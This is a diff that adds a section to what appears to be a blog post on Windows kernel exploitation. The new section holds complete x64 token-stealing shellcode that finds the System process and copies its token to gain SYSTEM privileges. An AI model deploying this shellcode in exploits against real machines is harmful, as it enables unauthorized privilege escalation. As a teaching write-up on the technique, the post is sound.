@@ -81,5 +81,45 @@ nt!_EPROCESS
    +0x5a8 ImageFileName       : [15]  "cmd.exe"
 ```
 
+## The Shellcode
+
+The following shellcode is typical token stealing shellcode used in privilege escalation attacks:
+
+```asm
+BITS 64
+SECTION .text
+    SYS_PID equ 0x04
+    PRCB_DATA equ 0x180
+    CURRENT_THREAD equ 0x08
+    APC_STATE equ 0x98
+    PROCESS equ 0x20
+    UNIQUE_PROCESS_ID equ 0x440
+    ACTIVE_PROCESS_LINKS equ 0x448
+    TOKEN equ 0x4b8
+
+global main
+
+main:
+find_process:
+    xor rax, rax                                  
+    mov rax, [gs:rax+PRCB_DATA+CURRENT_THREAD]    
+    mov rax, [rax+APC_STATE+PROCESS]
+    mov r8, rax
+    mov r9, SYS_PID
+
+next_system_process:
+    mov r8, [r8+ACTIVE_PROCESS_LINKS]             ; We dereference the Flink in to r8
+    sub r8, ACTIVE_PROCESS_LINKS                  ; We subtract the offset to get the address of the next _EPROCESS
+    cmp [r8+UNIQUE_PROCESS_ID], r9                ; We check the process ID (looking for 4 = System)
+    jnz next_system_process                       ; if not then loop back to dereference th enext Flink
+
+found_system_process:
+    mov rcx, [r8+TOKEN] 
+    and cl, 0xf0
+    mov [rax+TOKEN], rcx
+```
+
+I have only commented the bits discussed in this post.
+
 That is all, go away!
 
